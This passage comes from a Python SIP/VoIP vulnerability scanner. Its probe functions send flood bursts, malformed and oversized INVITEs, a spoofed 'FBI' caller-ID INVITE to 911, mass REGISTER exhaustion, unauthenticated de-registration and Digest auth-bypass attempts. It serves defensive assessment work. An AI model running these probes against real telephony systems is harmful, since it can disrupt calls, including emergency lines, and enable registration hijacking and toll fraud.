                f'SIP OPTIONS Allow: at {host}:{port} includes SUBSCRIBE. '
                f'Unauthenticated SUBSCRIBE to presence event packages may '
                f'disclose extension registration state and phone status '
                f'(RFC 3856/3265 presence model; ch13 event-package exposure).'
            ),
            'host': host,
            'port': port,
        })

    if 'REFER' in methods:
        findings.append({
            'severity': 'HIGH',
            'title': 'SIP_REFER_ALLOWED — call transfer without auth',
            'detail': (
                f'SIP OPTIONS Allow: at {host}:{port} includes REFER. '
                f'REFER without authentication enables unauthenticated call '
                f'transfer (RFC 3515): attacker transfers active calls to '
                f'arbitrary destinations, enabling toll fraud and interception '
                f'(ch13; ZBF policy missing match sip request-method refer).'
            ),
            'host': host,
            'port': port,
        })

    if 'NOTIFY' in methods:
        findings.append({
            'severity': 'LOW',
            'title': 'SIP_NOTIFY_ALLOWED',
            'detail': (
                f'SIP OPTIONS Allow: at {host}:{port} includes NOTIFY. '
                f'NOTIFY messages carry event state; unauthenticated NOTIFY '
                f'injection may disrupt subscriptions or trigger dialplan '
                f'actions depending on PBX configuration.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def check_rtp_port_range(host: str, start_port: int = 10000,
                         end_port: int = 10010,
                         timeout: float = 1.0) -> list:
    """
    RTP media port exposure scan.

    Sends a minimal 12-byte RTP packet to each UDP port in [start_port, end_port).
    RTP header fields: version=2, padding=0, extension=0, CC=0, marker=0,
    payload_type=8 (G.711 A-law), sequence=1, timestamp=160 (20ms frame),
    SSRC=0x12345678.

    Ch13: Cisco ASA/IOS ZBF SIP inspection dynamically pins RTP media pinholes
    via the SDP c= and m= lines.  If inspection is disabled, RTP ports are
    permanently open; any host can inject or receive media streams.

    Findings:
      MEDIUM — RTP_MEDIA_PORT_OPEN       (any UDP port responds)
      HIGH   — MEDIA_PORT_RANGE_OPEN     (3+ ports respond; SIP media leak likely)
    """
    import struct

    findings: list = []
    responding_ports: list = []

    # Build minimal RTP packet: 12-byte fixed header
    # Byte 0: V=2 (bits 7-6), P=0, X=0, CC=0  => 0x80
    # Byte 1: M=0, PT=8 (G.711 A-law)          => 0x08
    # Bytes 2-3: sequence number = 1            => 0x0001
    # Bytes 4-7: timestamp = 160                => 0x000000A0
    # Bytes 8-11: SSRC = 0x12345678
    rtp_packet = struct.pack('>BBHII',
                             0x80,        # V=2, P=0, X=0, CC=0
                             0x08,        # M=0, PT=8
                             1,           # sequence number
                             160,         # timestamp
                             0x12345678)  # SSRC

    for probe_port in range(start_port, end_port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(rtp_packet, (host, probe_port))
            try:
                data, _ = sock.recvfrom(2048)
                if data:
                    responding_ports.append(probe_port)
            except socket.timeout:
                pass
            sock.close()
        except OSError:
            pass

    if responding_ports:
        if len(responding_ports) >= 3:
            findings.append({
                'severity': 'HIGH',
                'title': 'MEDIA_PORT_RANGE_OPEN — SIP media leak possible',
                'detail': (
                    f'{len(responding_ports)} UDP media ports responded on '
                    f'{host} (ports {responding_ports}). Statically open RTP '
                    f'port range indicates SIP inspection pinhole management is '
                    f'absent; any node on the network path can inject or capture '
                    f'unencrypted G.711 audio streams (ch13 ZBF RTP inspection '
                    f'policy not enforced).'
                ),
                'host': host,
                'port': responding_ports[0],
            })
        else:
            for p in responding_ports:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'RTP_MEDIA_PORT_OPEN',
                    'detail': (
                        f'UDP {host}:{p} responded to RTP probe packet. '
                        f'Media port reachable; verify whether SIP inspection '
                        f'dynamic pinhole management governs this port or it is '
                        f'statically open (ch13).'
                    ),
                    'host': host,
                    'port': p,
                })

    return findings


def probe_webrtc_signaling(host: str, port: int = 8443,
                           timeout: float = 5.0) -> list:
    """
    WebRTC/TURN/STUN server exposure probe.

    UDP/3478 — STUN Binding Request (RFC 5389).  Magic cookie 0x2112A442 +
    12-byte random transaction ID.  A Binding Response (0x0101) confirms a
    STUN server.  A TURN Allocate Response (0x0103) without auth = unauthenticated
    relay allocation.

    TCP/8443 — WebRTC signaling WebSocket endpoint.  HTTP GET /ws with
    Upgrade: websocket; HTTP 101 Switching Protocols = active WebSocket
    signaling endpoint (media description without credential gate).

    Ch12/ch13: STUN/TURN are ALG-transparent to Cisco IOS ZBF; no built-in
    TURN inspection policy exists.  An open TURN relay is a full network
    relay primitive reachable through NAT/firewall without inspection.

    Findings:
      MEDIUM — STUN_SERVER_RESPONDS         (STUN Binding Response 0x0101)
      HIGH   — TURN_UNAUTH_ALLOCATION       (TURN Allocate succeeds without auth)
      MEDIUM — WEBSOCKET_SIGNALING_ENDPOINT (HTTP 101 on TCP/8443 /ws)
    """
    import struct

    findings: list = []
    stun_port = 3478

    # --- STUN Binding Request ---
    # Message Type: 0x0001 (Binding Request)
    # Message Length: 0x0000 (no attributes)
    # Magic Cookie: 0x2112A442
    # Transaction ID: 12 random bytes
    tx_id = bytes(random.randint(0, 255) for _ in range(12))
    stun_binding = struct.pack('>HHI', 0x0001, 0x0000, 0x2112A442) + tx_id

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(stun_binding, (host, stun_port))
        try:
            data, _ = sock.recvfrom(2048)
            if len(data) >= 4:
                resp_type = struct.unpack_from('>H', data, 0)[0]
                if resp_type == 0x0101:  # Binding Response (Success)
                    findings.append({
                        'severity': 'MEDIUM',
                        'title': 'STUN_SERVER_RESPONDS',
                        'detail': (
                            f'UDP {host}:{stun_port} returned STUN Binding Success '
                            f'Response (0x0101). STUN server active; NAT traversal '
                            f'service reachable. Enables ICE candidate gathering '
                            f'for WebRTC peers without firewall intervention '
                            f'(ch12: STUN is ALG-transparent to ZBF).'
                        ),
                        'host': host,
                        'port': stun_port,
                    })
                elif resp_type == 0x0111:  # Binding Error Response
                    findings.append({
                        'severity': 'MEDIUM',
                        'title': 'STUN_SERVER_RESPONDS',
                        'detail': (
                            f'UDP {host}:{stun_port} returned STUN Binding Error '
                            f'Response (0x0111). STUN server active but rejected '
                            f'the request.'
                        ),
                        'host': host,
                        'port': stun_port,
                    })
        except socket.timeout:
            pass
        sock.close()
    except OSError:
        pass

    # --- TURN Allocate Request (unauthenticated) ---
    # Message Type: 0x0003 (Allocate Request)
    # Message Length: 0x0000
    # Magic Cookie: 0x2112A442
    # New transaction ID
    tx_id2 = bytes(random.randint(0, 255) for _ in range(12))
    turn_alloc = struct.pack('>HHI', 0x0003, 0x0000, 0x2112A442) + tx_id2

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(turn_alloc, (host, stun_port))
        try:
            data, _ = sock.recvfrom(2048)
            if len(data) >= 4:
                resp_type = struct.unpack_from('>H', data, 0)[0]
                # 0x0103 = Allocate Success; 0x0113 = Allocate Error (expected w/ auth)
                if resp_type == 0x0103:
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'TURN_UNAUTH_ALLOCATION',
                        'detail': (
                            f'UDP {host}:{stun_port} returned TURN Allocate Success '
                            f'(0x0103) to an unauthenticated Allocate Request. '
                            f'TURN relay accepts connections without LONG-TERM '
                            f'credentials (RFC 5766 §7.3 auth requirement bypassed). '
                            f'Attacker gains a full UDP relay through the server, '
                            f'bypassing firewall egress controls (ch12: no ZBF TURN '
                            f'inspection policy; relay is opaque to Cisco ASA).'
                        ),
                        'host': host,
                        'port': stun_port,
                    })
        except socket.timeout:
            pass
        sock.close()
    except OSError:
        pass

    # --- TCP/8443: WebSocket signaling probe ---
    ws_key = 'dGhlIHNhbXBsZSBub25jZQ=='  # RFC 6455 example key
    http_req = (
        f'GET /ws HTTP/1.1\r\n'
        f'Host: {host}:{port}\r\n'
        f'Upgrade: websocket\r\n'
        f'Connection: Upgrade\r\n'
        f'Sec-WebSocket-Key: {ws_key}\r\n'
        f'Sec-WebSocket-Version: 13\r\n'
        f'\r\n'
    )
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(http_req.encode('utf-8'))
        response = b''
        try:
            response = sock.recv(2048)
        except socket.timeout:
            pass
        sock.close()
        resp_str = response.decode('utf-8', errors='replace')
        if '101' in resp_str and 'Switching Protocols' in resp_str:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'WEBSOCKET_SIGNALING_ENDPOINT',
                'detail': (
                    f'TCP {host}:{port} returned HTTP 101 Switching Protocols to '
                    f'GET /ws with Upgrade: websocket. WebSocket signaling endpoint '
                    f'active; WebRTC session description exchange possible without '
                    f'prior credential gate (ch12: WebSocket upgrade is opaque to '
                    f'ZBF http inspection; media ICE candidates follow via STUN).'
                ),
                'host': host,
                'port': port,
            })
    except (socket.timeout, OSError, ConnectionRefusedError):
        pass

    return findings


# ---------------------------------------------------------------------------
# DoS / TDoS / Eavesdrop / Auth-weakness standalone probes
# Synthesized from:
#   Hacking Exposed UC VoIP — Ch07 (TDoS), Ch14 (Fuzzing/Flooding)
# ---------------------------------------------------------------------------


def detect_sip_flood_surface(host: str, port: int = 5060,
                              timeout: float = 5.0) -> list:
    """
    SIP flood attack surface detection.

    Three probes:
      1. Half-open INVITE burst (3 rapid INVITEs, no ACK) — if all three are
         accepted (any non-drop response) without rate-limiting, the server's
         session table is exhausted-able via INVITE flood (ch07/ch14 TDoS
         resource-exhaustion vector).
      2. Malformed SIP — INVITE missing the required Via header.  A compliant
         proxy MUST return 400 Bad Request; silently processing malformed
         messages indicates a loose parser and an open fuzzing surface (ch14).
      3. Oversized Contact URI (8 KB) — if the server responds rather than
         closing the connection, it processes oversized inputs at the SIP
         parser layer (potential buffer-overflow or memory-leak surface, ch14).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    local_ip = _get_local_ip()

    # ------------------------------------------------------------------
    # Probe 1: half-open INVITE burst (3 rapid INVITEs, no ACK)
    # ------------------------------------------------------------------
    accept_count = 0
    for _ in range(3):
        br = _branch()
        cid = _call_id(host)
        from_tag = _tag()
        rtp_port = random.randint(49152, 65000)
        sdp = (
            'v=0\r\n'
            f'o=flood 0 0 IN IP4 {local_ip}\r\n'
            's=s\r\n'
            f'c=IN IP4 {local_ip}\r\n'
            't=0 0\r\n'
            f'm=audio {rtp_port} RTP/AVP 0\r\n'
            'a=rtpmap:0 PCMU/8000\r\n'
        )
        sdp_len = len(sdp.encode('utf-8'))
        lines = [
            f'INVITE sip:100@{host} SIP/2.0',
            f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br}',
            'Max-Forwards: 70',
            f'From: <sip:flood@{local_ip}>;tag={from_tag}',
            f'To: <sip:100@{host}>',
            f'Call-ID: {cid}',
            'CSeq: 1 INVITE',
            f'Contact: <sip:flood@{local_ip}:5060>',
            'Content-Type: application/sdp',
            f'Content-Length: {sdp_len}',
            '',
            sdp,
        ]
        msg = '\r\n'.join(lines)
        resp = _send_udp_sip(host, port, msg, timeout)
        code = _parse_status_code(resp)
        if code != 0:
            accept_count += 1
        # no ACK — intentionally half-open

    if accept_count == 3:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_NO_RATE_LIMIT — TDoS via INVITE flood possible',
            'detail': (
                f'Server {host}:{port} responded to all 3 rapid half-open '
                f'INVITE messages with no rate-limiting detected. '
                f'Session table exhaustion via sustained INVITE flood is '
                f'possible without mitigating ACL or SIP rate-limit policy '
                f'(ch07 TDoS: resource exhaustion via half-open dialog accumulation).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 2: malformed SIP INVITE — missing Via header
    # ------------------------------------------------------------------
    cid2 = _call_id(host)
    from_tag2 = _tag()
    malformed = '\r\n'.join([
        f'INVITE sip:100@{host} SIP/2.0',
        # Via header intentionally omitted
        'Max-Forwards: 70',
        f'From: <sip:scanner@{local_ip}>;tag={from_tag2}',
        f'To: <sip:100@{host}>',
        f'Call-ID: {cid2}',
        'CSeq: 1 INVITE',
        f'Contact: <sip:scanner@{local_ip}:5060>',
        'Content-Length: 0',
        '',
        '',
    ])
    resp2 = _send_udp_sip(host, port, malformed, timeout)
    code2 = _parse_status_code(resp2)
    if code2 != 0:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_MALFORMED_ACCEPTED — fuzzing surface',
            'detail': (
                f'Server {host}:{port} returned {code2} to an INVITE with '
                f'no Via header (mandatory per RFC 3261 §8.1.1). Parser did '
                f'not silently discard the malformed message. '
                f'Indicates lax input validation; SIP protocol fuzzing surface '
                f'is reachable (ch14 fuzzing: malformed headers as crash vectors).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 3: oversized Contact URI (8 KB)
    # ------------------------------------------------------------------
    oversized_uri = 'A' * 8192
    cid3 = _call_id(host)
    from_tag3 = _tag()
    br3 = _branch()
    large_msg = '\r\n'.join([
        f'INVITE sip:100@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br3}',
        'Max-Forwards: 70',
        f'From: <sip:scanner@{local_ip}>;tag={from_tag3}',
        f'To: <sip:100@{host}>',
        f'Call-ID: {cid3}',
        'CSeq: 1 INVITE',
        f'Contact: <sip:{oversized_uri}@{local_ip}:5060>',
        'Content-Length: 0',
        '',
        '',
    ])
    resp3 = _send_udp_sip(host, port, large_msg, timeout)
    code3 = _parse_status_code(resp3)
    if code3 in (200, 400, 401, 403, 404, 486, 100, 180, 183):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_OVERSIZED_URI_ACCEPTED',
            'detail': (
                f'Server {host}:{port} returned {code3} to INVITE with an '
                f'8 KB Contact URI (did not close the connection). '
                f'Parser accepts oversized header field values without dropping '
                f'the message; possible heap/stack pressure or buffer-copy '
                f'path exposed (ch14 SIP fuzzing: field-length mutation).'
            ),
            'host': host,
            'port': port,
        })

    return findings


def detect_tdos_indicators(host: str, port: int = 5060,
                            timeout: float = 5.0) -> list:
    """
    Telephony Denial of Service (TDoS) attack surface detection.

    Three probes:
      1. Caller-ID spoofing — INVITE with From: spoofed to a well-known
         number ("FBI") and from-tag containing a recognizable marker.  If the
         server returns 100 Trying without authenticating the caller identity,
         caller-ID spoofing into the PBX is trivially possible (ch07 TDoS:
         spoofed INVITEs to emergency lines, impersonation, harassing calls).
      2. OPTIONS rate-limit — 10 rapid OPTIONS probes with unique Call-IDs.
         If all 10 receive responses, the server has no per-source rate limit
         on the OPTIONS method; sustained OPTIONS flood is a low-amplification
         but steady-state CPU load vector (ch14 flooding).
      3. REGISTER exhaustion — 100 REGISTER messages for the same AoR but
         with unique Contact URIs (simulating multiple device registrations).
         If all are accepted (200 OK), the server's location-service table
         can be filled with ghost bindings, displacing legitimate registrations
         (ch07 registration exhaustion / de-registration-by-flood).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    local_ip = _get_local_ip()

    # ------------------------------------------------------------------
    # Probe 1: caller-ID spoofing — INVITE From: spoofed number
    # ------------------------------------------------------------------
    br = _branch()
    cid = _call_id(host)
    from_tag = _tag()
    sdp = (
        'v=0\r\n'
        f'o=tdos 0 0 IN IP4 {local_ip}\r\n'
        's=s\r\n'
        f'c=IN IP4 {local_ip}\r\n'
        't=0 0\r\n'
        f'm=audio {random.randint(49152, 65000)} RTP/AVP 0\r\n'
        'a=rtpmap:0 PCMU/8000\r\n'
    )
    sdp_len = len(sdp.encode('utf-8'))
    spoof_msg = '\r\n'.join([
        f'INVITE sip:911@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br}',
        'Max-Forwards: 70',
        f'From: "FBI" <sip:18005551234@{local_ip}>;tag=FBI-{from_tag}',
        f'To: <sip:911@{host}>',
        f'Call-ID: {cid}',
        'CSeq: 1 INVITE',
        f'Contact: <sip:{local_ip}:5060>',
        'Content-Type: application/sdp',
        f'Content-Length: {sdp_len}',
        '',
        sdp,
    ])
    resp = _send_udp_sip(host, port, spoof_msg, timeout)
    code = _parse_status_code(resp)
    if code == 100:
        findings.append({
            'severity': 'HIGH',
            'title': 'SIP_CALLER_ID_SPOOFING_POSSIBLE',
            'detail': (
                f'Server {host}:{port} returned 100 Trying to INVITE with '
                f'spoofed From: "FBI" <sip:18005551234> without authentication. '
                f'Caller-ID is not validated before provisional response; '
                f'arbitrary caller identity can be injected into the PBX '
                f'(ch07 TDoS: spoofed emergency-line INVITEs, harassing calls '
                f'with impersonated authorities).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 2: OPTIONS rate-limit — 10 rapid OPTIONS
    # ------------------------------------------------------------------
    options_responses = 0
    for _ in range(10):
        br2 = _branch()
        cid2 = _call_id(host)
        from_tag2 = _tag()
        opts = '\r\n'.join([
            f'OPTIONS sip:{host} SIP/2.0',
            f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br2}',
            'Max-Forwards: 70',
            f'From: <sip:ratelimit@{local_ip}>;tag={from_tag2}',
            f'To: <sip:{host}>',
            f'Call-ID: {cid2}',
            'CSeq: 1 OPTIONS',
            f'Contact: <sip:ratelimit@{local_ip}:5060>',
            'Content-Length: 0',
            '',
            '',
        ])
        r = _send_udp_sip(host, port, opts, timeout)
        if _parse_status_code(r) != 0:
            options_responses += 1

    if options_responses >= 8:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_OPTIONS_RATE_UNLIMITED',
            'detail': (
                f'Server {host}:{port} responded to {options_responses}/10 rapid '
                f'OPTIONS requests with no apparent rate-limiting or slowdown. '
                f'Sustained OPTIONS flood (unique Call-IDs, high pps) will consume '
                f'CPU on the SIP proxy without triggering call-state limits '
                f'(ch14: method-flood vector; OPTIONS generates state on some '
                f'implementations despite being stateless by intent).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 3: REGISTER exhaustion — 100 REGISTERs, same AoR, unique Contact
    # ------------------------------------------------------------------
    accepted = 0
    aor = f'exhaustion{random.randint(1000, 9999)}'
    cid_base = uuid.uuid4().hex
    for i in range(100):
        br3 = _branch()
        unique_contact = f'sip:{aor}-{i}@{local_ip}:{random.randint(30000, 60000)}'
        from_tag3 = _tag()
        reg_msg = '\r\n'.join([
            f'REGISTER sip:{host} SIP/2.0',
            f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br3}',
            'Max-Forwards: 70',
            f'From: <sip:{aor}@{host}>;tag={from_tag3}',
            f'To: <sip:{aor}@{host}>',
            f'Call-ID: {cid_base}-{i}@{host}',
            f'CSeq: {i + 1} REGISTER',
            f'Contact: <{unique_contact}>',
            'Expires: 3600',
            'Content-Length: 0',
            '',
            '',
        ])
        r = _send_udp_sip(host, port, reg_msg, timeout)
        if _parse_status_code(r) == 200:
            accepted += 1

    if accepted >= 50:
        findings.append({
            'severity': 'HIGH',
            'title': 'SIP_REGISTRATION_EXHAUSTION_POSSIBLE',
            'detail': (
                f'Server {host}:{port} accepted {accepted}/100 REGISTER '
                f'messages for the same AoR with unique Contact URIs (no '
                f'per-AoR binding limit enforced). Location-service table can '
                f'be flooded with ghost bindings, displacing legitimate device '
                f'registrations and routing all inbound calls to attacker-controlled '
                f'Contact URIs (ch07 TDoS: registration exhaustion / hijack via flood).'
            ),
            'host': host,
            'port': port,
        })

    return findings


def detect_sip_eavesdropping_surface(host: str, port: int = 5060,
                                      timeout: float = 5.0) -> list:
    """
    SIP eavesdropping attack surface detection.

    Three probes:
      1. Unauthenticated SUBSCRIBE to presence event package (RFC 3856).
         If the server returns 200 OK, an attacker receives real-time
         registration state, phone status, and dialog info for extensions
         without any credentials (ch07: enumeration via presence).
      2. Unsolicited NOTIFY — sends a NOTIFY outside any established
         subscription dialog.  If the server reflects content back (200 OK
         with a body or replayed headers), it processes NOTIFY without
         subscription state verification; injection surface for fake presence
         state and potential info-disclosure.
      3. SDP codec disclosure — INVITE with multiple m= lines offering
         several codecs before authentication completes.  If the server
         returns 200 or 183 with an SDP answer disclosing its codec list,
         media capabilities are enumerable without completing auth (ch11:
         codec negotiation as fingerprinting vector).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    local_ip = _get_local_ip()

    # ------------------------------------------------------------------
    # Probe 1: unauthenticated SUBSCRIBE to presence
    # ------------------------------------------------------------------
    br = _branch()
    cid = _call_id(host)
    from_tag = _tag()
    sub_msg = '\r\n'.join([
        f'SUBSCRIBE sip:100@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br}',
        'Max-Forwards: 70',
        f'From: <sip:watcher@{local_ip}>;tag={from_tag}',
        f'To: <sip:100@{host}>',
        f'Call-ID: {cid}',
        'CSeq: 1 SUBSCRIBE',
        f'Contact: <sip:watcher@{local_ip}:5060>',
        'Event: presence',
        'Accept: application/pidf+xml',
        'Expires: 3600',
        'Content-Length: 0',
        '',
        '',
    ])
    resp = _send_udp_sip(host, port, sub_msg, timeout)
    code = _parse_status_code(resp)
    if code == 200:
        findings.append({
            'severity': 'HIGH',
            'title': 'SIP_PRESENCE_SUBSCRIPTION_UNAUTH',
            'detail': (
                f'Server {host}:{port} returned 200 OK to unauthenticated '
                f'SUBSCRIBE with Event: presence. Real-time registration state, '
                f'online/offline status, and dialog info for extension 100 are '
                f'accessible without credentials (RFC 3856 presence; ch07: '
                f'passive extension surveillance without active probing).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 2: unsolicited NOTIFY
    # ------------------------------------------------------------------
    br2 = _branch()
    cid2 = _call_id(host)
    from_tag2 = _tag()
    notify_body = 'active'
    notify_msg = '\r\n'.join([
        f'NOTIFY sip:100@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br2}',
        'Max-Forwards: 70',
        f'From: <sip:notifier@{local_ip}>;tag={from_tag2}',
        f'To: <sip:100@{host}>',
        f'Call-ID: {cid2}',
        'CSeq: 1 NOTIFY',
        f'Contact: <sip:notifier@{local_ip}:5060>',
        'Event: presence',
        'Subscription-State: active;expires=3600',
        'Content-Type: text/plain',
        f'Content-Length: {len(notify_body)}',
        '',
        notify_body,
    ])
    resp2 = _send_udp_sip(host, port, notify_msg, timeout)
    code2 = _parse_status_code(resp2)
    # Check if server reflects content back (200 OK) rather than rejecting (481/489)
    if code2 == 200:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_NOTIFY_REFLECTS_UNSOLICITED',
            'detail': (
                f'Server {host}:{port} returned 200 OK to an unsolicited '
                f'NOTIFY (no prior SUBSCRIBE dialog). Server processes NOTIFY '
                f'without subscription-state verification (RFC 3265 §3.2: '
                f'NOTIFY without matching subscription MUST be rejected with 481). '
                f'Injection surface for fake presence state; may also disclose '
                f'internal routing in response headers.'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 3: SDP codec disclosure via multi-m= INVITE (no auth expected)
    # ------------------------------------------------------------------
    br3 = _branch()
    cid3 = _call_id(host)
    from_tag3 = _tag()
    sdp_multi = (
        'v=0\r\n'
        f'o=probe 0 0 IN IP4 {local_ip}\r\n'
        's=s\r\n'
        f'c=IN IP4 {local_ip}\r\n'
        't=0 0\r\n'
        f'm=audio {random.randint(49152, 65000)} RTP/AVP 0 8 9 18 101\r\n'
        'a=rtpmap:0 PCMU/8000\r\n'
        'a=rtpmap:8 PCMA/8000\r\n'
        'a=rtpmap:9 G722/8000\r\n'
        'a=rtpmap:18 G729/8000\r\n'
        'a=rtpmap:101 telephone-event/8000\r\n'
        f'm=video {random.randint(49152, 65000)} RTP/AVP 96 97\r\n'
        'a=rtpmap:96 H264/90000\r\n'
        'a=rtpmap:97 VP8/90000\r\n'
    )
    sdp_len = len(sdp_multi.encode('utf-8'))
    invite3 = '\r\n'.join([
        f'INVITE sip:100@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br3}',
        'Max-Forwards: 70',
        f'From: <sip:probe@{local_ip}>;tag={from_tag3}',
        f'To: <sip:100@{host}>',
        f'Call-ID: {cid3}',
        'CSeq: 1 INVITE',
        f'Contact: <sip:probe@{local_ip}:5060>',
        'Content-Type: application/sdp',
        f'Content-Length: {sdp_len}',
        '',
        sdp_multi,
    ])
    resp3 = _send_udp_sip(host, port, invite3, timeout)
    code3 = _parse_status_code(resp3)
    if code3 in (200, 183):
        sdp_info = parse_sdp_media(resp3)
        if sdp_info.get('codec') or sdp_info.get('profile'):
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SIP_SDP_CODEC_DISCLOSURE',
                'detail': (
                    f'Server {host}:{port} returned {code3} to unauthenticated '
                    f'INVITE with multi-codec SDP offer and included an SDP answer '
                    f'disclosing codec capabilities '
                    f'(codec={sdp_info.get("codec", "unknown")}, '
                    f'profile={sdp_info.get("profile", "unknown")}). '
                    f'Media capabilities enumerable without completing auth; '
                    f'codec fingerprint aids targeted codec-layer DoS and '
                    f'transcoder resource attacks (ch11: SDP negotiation '
                    f'as an enumeration vector pre-authentication).'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_sip_authentication_weaknesses(host: str, port: int = 5060,
                                         timeout: float = 5.0) -> list:
    """
    SIP authentication bypass and weakness probes.

    Four probes (four distinct bypass classes):
      1. Nonce replay — sends a REGISTER with a Digest Authorization header
         containing a hardcoded nonce value (replayed from a prior or crafted
         challenge).  If the server returns 200 OK, it does not validate nonce
         freshness and is vulnerable to replay attacks (RFC 3261 §22.4).
      2. Empty Digest response — REGISTER with Authorization header containing
         algorithm=MD5 and response="" (empty string).  Some SIP stacks skip
         response validation when the field is present but empty; 200 OK = bypass.
      3. Unauthenticated de-registration — REGISTER with Expires: 0 and no
         Authorization header.  If the server accepts this (200 OK), any caller
         can de-register any extension, causing calls to fail (availability attack).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    local_ip = _get_local_ip()

    # ------------------------------------------------------------------
    # Probe 1: nonce replay — Digest auth with replayed/crafted nonce
    # ------------------------------------------------------------------
    br = _branch()
    cid = _call_id(host)
    from_tag = _tag()
    # Use a plausible-looking but crafted nonce value
    fake_nonce = uuid.uuid4().hex
    fake_response = uuid.uuid4().hex  # not a valid MD5; tests if server validates
    replay_reg = '\r\n'.join([
        f'REGISTER sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br}',
        'Max-Forwards: 70',
        f'From: <sip:100@{host}>;tag={from_tag}',
        f'To: <sip:100@{host}>',
        f'Call-ID: {cid}',
        'CSeq: 1 REGISTER',
        f'Contact: <sip:100@{local_ip}:5060>',
        'Expires: 3600',
        (
            f'Authorization: Digest username="100", realm="{host}", '
            f'nonce="{fake_nonce}", uri="sip:{host}", '
            f'algorithm=MD5, response="{fake_response}"'
        ),
        'Content-Length: 0',
        '',
        '',
    ])
    resp = _send_udp_sip(host, port, replay_reg, timeout)
    code = _parse_status_code(resp)
    if code == 200:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SIP_NONCE_REPLAY_ACCEPTED',
            'detail': (
                f'Server {host}:{port} returned 200 OK to a REGISTER carrying '
                f'a Digest Authorization with a crafted/replayed nonce and '
                f'non-valid MD5 response. Server does not validate nonce '
                f'freshness or Digest response integrity (RFC 3261 §22.4 '
                f'nonce replay protection absent). Attacker can replay any '
                f'captured auth challenge response indefinitely to maintain '
                f'fraudulent registration.'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 2: empty Digest response — algorithm=MD5, response=""
    # ------------------------------------------------------------------
    br2 = _branch()
    cid2 = _call_id(host)
    from_tag2 = _tag()
    fake_nonce2 = uuid.uuid4().hex
    empty_resp_reg = '\r\n'.join([
        f'REGISTER sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br2}',
        'Max-Forwards: 70',
        f'From: <sip:100@{host}>;tag={from_tag2}',
        f'To: <sip:100@{host}>',
        f'Call-ID: {cid2}',
        'CSeq: 1 REGISTER',
        f'Contact: <sip:100@{local_ip}:5060>',
        'Expires: 3600',
        (
            f'Authorization: Digest username="100", realm="{host}", '
            f'nonce="{fake_nonce2}", uri="sip:{host}", '
            f'algorithm=MD5, response=""'
        ),
        'Content-Length: 0',
        '',
        '',
    ])
    resp2 = _send_udp_sip(host, port, empty_resp_reg, timeout)
    code2 = _parse_status_code(resp2)
    if code2 == 200:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SIP_AUTH_BYPASS_EMPTY_RESPONSE',
            'detail': (
                f'Server {host}:{port} returned 200 OK to REGISTER with '
                f'Authorization: Digest algorithm=MD5 and response="" (empty '
                f'string). SIP stack accepted an Authorization header without '
                f'validating the Digest response field. Unauthenticated '
                f'registration of any extension is possible by supplying a '
                f'structurally valid but content-empty Authorization header '
                f'(implementation-level auth bypass; no brute-force required).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 3: unauthenticated de-registration (Expires: 0, no auth)
    # ------------------------------------------------------------------
    br3 = _branch()
    cid3 = _call_id(host)
    from_tag3 = _tag()
    dereg_msg = '\r\n'.join([
        f'REGISTER sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br3}',
        'Max-Forwards: 70',
        f'From: <sip:100@{host}>;tag={from_tag3}',
        f'To: <sip:100@{host}>',
        f'Call-ID: {cid3}',
        'CSeq: 1 REGISTER',
        f'Contact: <sip:100@{local_ip}:5060>',
        'Expires: 0',
        'Content-Length: 0',
        '',
        '',
    ])
    resp3 = _send_udp_sip(host, port, dereg_msg, timeout)
    code3 = _parse_status_code(resp3)
    if code3 == 200:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_DEREGISTER_POSSIBLE_UNAUTH',
            'detail': (
                f'Server {host}:{port} returned 200 OK to REGISTER with '
                f'Expires: 0 and no Authorization header. Unauthenticated '
